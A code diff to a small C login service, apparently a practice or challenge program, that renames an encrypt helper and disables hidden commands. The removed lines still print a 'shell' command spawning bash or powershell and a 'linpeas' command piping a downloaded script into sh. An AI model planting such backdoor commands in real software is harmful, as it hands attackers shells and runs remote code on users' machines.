@@ -169,7 +169,7 @@ int create_account(int first_time, int logged_in) {
         id = 0;
     }
 
-    int* strin = encrypt(passwd);
+    int* strin = _encrypt(passwd);
     char* crypted = malloc(32 * sizeof(char) + 1);
     crypted = int_array_to_hex_string(strin, 16);
     
@@ -209,7 +209,7 @@ int check_cred(const char* user, const char* passwd){
         if (strcmp(f_user,user)==0) {
             char *pass_hash = strtok(NULL, " ");
 
-            int* strin = encrypt(passwd);
+            int* strin = _encrypt(passwd);
             char* crypted = malloc(32 * sizeof(char) + 1);
             crypted = int_array_to_hex_string(strin, 16);   
 
@@ -243,7 +243,7 @@ int confirm(char* msg, char _default) {
     
     printf("",choice);
 
-    switch (towlower(choice)) {
+    switch (tolower(choice)) {
         case 'y':
             return 1;
             
@@ -259,7 +259,7 @@ int confirm(char* msg, char _default) {
     }
 }
 
-void shell() {
+/*void shell() {
 
 #ifdef _WIN32
     system("powershell");
@@ -267,7 +267,7 @@ void shell() {
     system("/bin/bash");
 #endif
     
-}
+}*/
 
 void listUsers(char* output) {
     FILE* users_ptr = fopen(users_file, "r");
@@ -363,7 +363,7 @@ void handle_cmd(char* input, char* username, int logged_in, char* output) {
     
         if (delim_pos) {
             char* second_half = delim_pos + 1;
-            int* strin = encrypt(second_half);
+            int* strin = _encrypt(second_half);
             char* crypted = malloc(32 * sizeof(char) + 1);
             crypted = int_array_to_hex_string(strin, 16);
             crypted[32] = '\n';
@@ -408,12 +408,13 @@ void handle_cmd(char* input, char* username, int logged_in, char* output) {
     }
 
     if (strcmp(cmd,"shell")==0) {
-        shell();
+        printf("Shell removed do to being flagged by antivirus\n");
+        //shell();
     }
 
-    if (strcmp(cmd,"linpeas")==0) {
+    /*if (strcmp(cmd,"linpeas")==0) {
         system("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh");
-    }
+    }*/
 
     if (strcmp(cmd,"users")==0) {
         listUsers(output);
@@ -457,6 +458,7 @@ void handle_cmd(char* input, char* username, int logged_in, char* output) {
 }
 
 int main() {
+    setbuf(stdout, NULL);
     printf("Welcomem to Amon's login service.\n");
     FILE* users_ptr;
     users_ptr = fopen(users_file, "r");
